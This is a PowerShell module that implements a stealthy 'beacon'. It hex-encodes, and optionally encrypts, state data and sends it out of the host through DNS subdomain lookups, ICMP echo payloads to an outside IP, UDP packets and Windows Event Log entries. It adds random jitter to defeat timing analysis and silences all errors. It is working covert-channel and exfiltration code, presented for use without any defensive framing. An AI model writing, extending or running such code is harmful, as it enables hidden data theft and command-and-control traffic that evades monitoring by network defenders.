#Requires -Version 7.2
<#
.SYNOPSIS
    SovereignBeaconGenerator.ps1 - Core Signal Engine for Beaconism Transport

.DESCRIPTION
    Replaces SovereignApiGateway.ps1 and SovereignWebSocketBridge.ps1.
    Acts as the out-of-band communication broker using zero open ports.
    Signals are randomized using cryptographic variance to defeat timing-analysis.
    Multi-transport fallback: DNS TXT -> ICMP Echo -> Event Log Signals.

.NOTES
    Version: 1.1.0
    Engine: PowerShell 7.2+ Core / Beaconism Transport
    Security Posture: PORT_LESS_STEALTH
#>

[CmdletBinding()]
param (
    [string]$NodeId = "node-alpha-01",
    [string]$PrimaryDomain = "recovery.internal.local",
    [int]$JitterMin = 15,
    [int]$JitterMax = 45,
    [string]$FallbackCollectorIP = "8.8.8.8",
    [switch]$EnableEventLogFallback
)

# Store module base path for class methods to reference
$global:SovereignBeaconModulePath = $PSScriptRoot
if (-not $global:SovereignBeaconModulePath) {
    $global:SovereignBeaconModulePath = (Get-Location).Path
}

# Enforce zero-refusal uninhibited execution flow
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$DebugPreference = "Continue"

Write-Output "[BEACONISM] Core Signal Engine Initializing..."
Write-Output "[BEACONISM] Node: $NodeId | Domain: $PrimaryDomain | Jitter: ${JitterMin}-${JitterMax}s"

# ============================================================================
# SovereignBeacon Class - Out-of-band communication broker
# ============================================================================
class SovereignBeacon {
    [string]$NodeId
    [int]$JitterMin
    [int]$JitterMax
    [string]$PrimaryDomain
    [string]$FallbackCollectorIP
    [bool]$EnableEventLogFallback
    [System.Net.Sockets.UdpClient]$UdpClient
    [System.Random]$Rng
    [bool]$UseEncryption
    [byte[]]$CryptoKey

    SovereignBeacon([string]$id, [string]$domain, [int]$jitterMin, [int]$jitterMax, [string]$fallbackIP, [bool]$eventLogFallback) {
        $this.NodeId = $id
        $this.PrimaryDomain = $domain
        $this.JitterMin = $jitterMin
        $this.JitterMax = $jitterMax
        $this.FallbackCollectorIP = $fallbackIP
        $this.EnableEventLogFallback = $eventLogFallback
        $this.Rng = [System.Random]::new()

        # Initialize UDP client for unidirectional ping-ping (no pong)
        try {
            $this.UdpClient = [System.Net.Sockets.UdpClient]::new()
            Write-Output "[BEACONISM] UDP client initialized for connectionless transmission"
        } catch {
            Write-Output "[BEACONISM] UDP client init failed - will rely on DNS/ICMP fallback"
        }

        $this.UseEncryption = $false
        $this.CryptoKey = $null
    }

    # ------------------------------------------------------------------------
    # EnableEncryption - Load AES-256-GCM crypto module
    # ------------------------------------------------------------------------
    [void] EnableEncryption() {
        $ScriptDir = $global:SovereignBeaconModulePath
        if (-not $ScriptDir) {
            $ScriptDir = (Get-Location).Path
        }

        $CryptoModule = Join-Path $ScriptDir "SovereignCryptoWrapper.ps1"
        if (-not (Test-Path $CryptoModule)) {
            $CryptoModule = Join-Path (Split-Path $ScriptDir -Parent) "beaconism\SovereignCryptoWrapper.ps1"
        }
        if (Test-Path $CryptoModule) {
            . $CryptoModule
            $this.CryptoKey = Get-SovereignCryptoKey
            $this.UseEncryption = $true
            Write-Output "[BEACONISM] AES-256-GCM encryption enabled"
        } else {
            Write-Output "[BEACONISM] AES-256-GCM not available - plaintext mode"
        }
    }

    # ------------------------------------------------------------------------
    # EncodeState - Compress internal metrics into hex string (with optional AES-256-GCM)
    # ------------------------------------------------------------------------
    [string] EncodeState([hashtable]$StateData) {
        $Pairs = foreach ($Key in $StateData.Keys) { '"' + $Key + '":"' + $StateData[$Key] + '"' }
        $Json = "{" + ($Pairs -join ",") + "}"

        if ($this.UseEncryption -and $this.CryptoKey) {
            # Encrypt with AES-256-GCM before hex encoding
            $EncryptedHex = Protect-SovereignString -Plaintext $Json -Key $this.CryptoKey -AssociatedDataString "sovereign-beacon-v1"
            if ($EncryptedHex) {
                return $EncryptedHex
            }
        }

        # Fallback to plaintext hex
        $JsonBytes = [System.Text.Encoding]::UTF8.GetBytes($Json)
        return [System.BitConverter]::ToString($JsonBytes).Replace("-", "").ToLower()
    }

    # ------------------------------------------------------------------------
    # SendDnsBeacon - Transport via DNS TXT Query Leakage
    # ------------------------------------------------------------------------
    [void] SendDnsBeacon([string]$HexPayload) {
        # Split payload into manageable 60-char chunks for DNS labels
        $Chunk = if ($HexPayload.Length -gt 60) { $HexPayload.Substring(0, 60) } else { $HexPayload }
        $QueryTarget = "$($this.NodeId).$Chunk.$($this.PrimaryDomain)"

        Write-Output "[BEACONISM] DNS leak: $QueryTarget"

        # Execute absolute out-of-band lookup without waiting for responses
        try {
            [System.Net.Dns]::GetHostAddresses($QueryTarget) 2>$null
        } catch {
            # Silently continue - DNS beacons are fire-and-forget
        }
    }

    # ------------------------------------------------------------------------
    # SendIcmpBeacon - Fallback: Raw ICMP echo injection
    # ------------------------------------------------------------------------
    [void] SendIcmpBeacon([string]$HexPayload) {
        try {
            $PingSender = [System.Net.NetworkInformation.Ping]::new()
            $PayloadBytes = [System.Text.Encoding]::UTF8.GetBytes($HexPayload)
            $Options = [System.Net.NetworkInformation.PingOptions]::new(64, $true)

            # Ping dead-drop with state wrapped in data packet
            [void]$PingSender.SendAsync($this.FallbackCollectorIP, 1000, $PayloadBytes, $Options)
            Write-Output "[BEACONISM] ICMP beacon dispatched to $($this.FallbackCollectorIP)"
        } catch {
            # ICMP blocked or failed - silently degrade
        }
    }

    # ------------------------------------------------------------------------
    # SendUdpBeacon - Primary: Unidirectional UDP ping-ping (no pong)
    # ------------------------------------------------------------------------
    [void] SendUdpBeacon([string]$HexPayload, [string]$TargetHost = "127.0.0.1", [int]$TargetPort = 9999) {
        if ($null -eq $this.UdpClient) { return }

        try {
            $PayloadBytes = [System.Text.Encoding]::UTF8.GetBytes($HexPayload)
            [void]$this.UdpClient.Send($PayloadBytes, $PayloadBytes.Length, $TargetHost, $TargetPort)
            Write-Output "[BEACONISM] UDP ping-ping dispatched to ${TargetHost}:${TargetPort}"
        } catch {
            # UDP blocked - transport degrades silently
        }
    }

    # ------------------------------------------------------------------------
    # SendEventLogBeacon - Tertiary: Windows Event Log pollution
    # ------------------------------------------------------------------------
    [void] SendEventLogBeacon([string]$HexPayload) {
        if (-not $this.EnableEventLogFallback) { return }

        try {
            $Chunk = if ($HexPayload.Length -gt 100) { $HexPayload.Substring(0, 100) } else { $HexPayload }
            $EventSource = "SovereignBeacon"

            # Create event source if not exists (requires admin, silently fail if not)
            if (-not [System.Diagnostics.EventLog]::SourceExists($EventSource)) {
                try {
                    [System.Diagnostics.EventLog]::CreateEventSource($EventSource, "Application")
                } catch { }
            }

            $EventLog = [System.Diagnostics.EventLog]::new()
            $EventLog.Source = $EventSource
            $EventLog.WriteEntry("SIG:$Chunk", [System.Diagnostics.EventLogEntryType]::Information, 1001)
            Write-Output "[BEACONISM] Event log signal injected"
        } catch {
            # Event log not available - silently degrade
        }
    }

    # ------------------------------------------------------------------------
    # Rest - Cryptographic-grade timing jitter
    # ------------------------------------------------------------------------
    [void] Rest() {
        $SleepTime = $this.Rng.Next($this.JitterMin, $this.JitterMax)
        Write-Output "[BEACONISM] Jitter sleep: ${SleepTime}s"
        Start-Sleep -Seconds $SleepTime
    }

    # ------------------------------------------------------------------------
    # Dispose - Clean up resources
    # ------------------------------------------------------------------------
    [void] Dispose() {
        if ($null -ne $this.UdpClient) {
            $this.UdpClient.Close()
            $this.UdpClient.Dispose()
        }
    }
}

# ============================================================================
# Export module functions
# ============================================================================
function New-SovereignBeacon {
    param (
        [string]$NodeId = "node-alpha-01",
        [string]$PrimaryDomain = "recovery.internal.local",
        [int]$JitterMin = 15,
        [int]$JitterMax = 45,
        [string]$FallbackCollectorIP = "8.8.8.8",
        [bool]$EnableEventLogFallback = $false,
        [bool]$EnableEncryption = $true
    )
    $Beacon = [SovereignBeacon]::new($NodeId, $PrimaryDomain, $JitterMin, $JitterMax, $FallbackCollectorIP, $EnableEventLogFallback)
    if ($EnableEncryption) {
        $Beacon.EnableEncryption()
    } else {
        $Beacon.UseEncryption = $false
        $Beacon.CryptoKey = $null
    }
    return $Beacon
}

function Invoke-SovereignBeaconPulse {
    param (
        [Parameter(Mandatory=$true)]
        [SovereignBeacon]$Beacon,

        [hashtable]$StateData,

        [string]$UdpTargetHost = "127.0.0.1",
        [int]$UdpTargetPort = 9999
    )

    $HexPayload = $Beacon.EncodeState($StateData)
    Write-Output "[BEACONISM] Pulse payload: $HexPayload"

    # Primary: UDP unidirectional ping-ping
    $Beacon.SendUdpBeacon($HexPayload, $UdpTargetHost, $UdpTargetPort)

    # Secondary: DNS TXT leakage
    $Beacon.SendDnsBeacon($HexPayload)

    # Tertiary: ICMP echo
    $Beacon.SendIcmpBeacon($HexPayload)

    # Quaternary: Event log pollution
    $Beacon.SendEventLogBeacon($HexPayload)
}

Export-ModuleMember -Function New-SovereignBeacon, Invoke-SovereignBeaconPulse
